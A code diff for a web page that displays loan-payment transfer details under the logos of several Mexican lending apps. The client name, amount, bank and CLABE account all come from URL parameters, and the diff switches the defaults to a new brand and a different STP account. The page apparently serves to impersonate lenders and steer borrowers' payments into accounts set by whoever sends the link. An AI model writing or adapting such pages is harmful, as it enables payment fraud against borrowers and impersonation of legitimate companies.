@@ -42,7 +42,7 @@
                 </div>
                 <div class="flex justify-between border-b border-slate-200/60 pb-2">
                     <span class="text-gray-400 uppercase text-[9px] tracking-wider">Banco / Método</span>
-                    <span id="txt-banco" class="font-black text-slate-900">MIFEL</span>
+                    <span id="txt-banco" class="font-black text-slate-900">STP</span>
                 </div>
 
                 <!-- Bloque de transferencia más compacto (Link / CLABE) -->
@@ -68,6 +68,7 @@
 
     <script>
         const APPS = {
+            nubeprest: { name: 'Nube Prest', color: '#0284c7', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/df/e7/e1/dfe7e1bc-02a2-5918-ad88-9f6d41b60a95/Placeholder.mill/400x400bb-75.webp' },
             baubap: { name: 'Baubap', color: '#10b981', img: 'https://play-lh.googleusercontent.com/8bT4kFxFzPy078zlO7h97O2fTBLu5NTemiSr2oxtMnRdZu8OFr5Js7HJ_rMXkL5N0DfHiaTH2vGMhXn353ol=w240-h480-rw' },
             vivus: { name: 'Vivus', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/FpMOQImteiJbZywbqSs6SNQ0ChSTrKNrdQ8I1y9oZjfG8oNv8UbdY-arrWTjFWOU7xZFhOsZ3qkL5UM2JWxO=w240-h480-rw' },
             efectivohoy: { name: 'Efectivo Hoy', color: '#10b981', img: 'https://play-lh.googleusercontent.com/jVIVA0_ESxvZoa1KZiMlVE6AZF333aD9SHdyUEoPabhC-QvI9Yoj9E78PBIC0DWUZeE8_CFF9oncLVveolJg' },
@@ -105,8 +106,8 @@
 
         const p = new URLSearchParams(window.location.search);
         
-        const appKey = p.get('app') || 'baubap';
-        const appInfo = APPS[appKey] || APPS['baubap'];
+        const appKey = p.get('app') || 'nubeprest';
+        const appInfo = APPS[appKey] || APPS['nubeprest'];
 
         document.getElementById('header-bg').style.backgroundColor = appInfo.color;
         document.getElementById('img-app').src = appInfo.img;
@@ -116,9 +117,9 @@
         document.getElementById('txt-monto').innerText = '$' + montoFormateado;
         document.getElementById('txt-cliente').innerText = decodeURIComponent(p.get('n') || 'CLIENTE');
         document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
-        document.getElementById('txt-clabe').innerText = p.get('c') || '042180010077990354';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '646180402349078374';
 
-        let bancoLimpio = p.get('b') || 'MIFEL';
+        let bancoLimpio = p.get('b') || 'STP';
         bancoLimpio = bancoLimpio.replace(/[1234]/g, '').trim(); 
         document.getElementById('txt-banco').innerText = bancoLimpio;
 
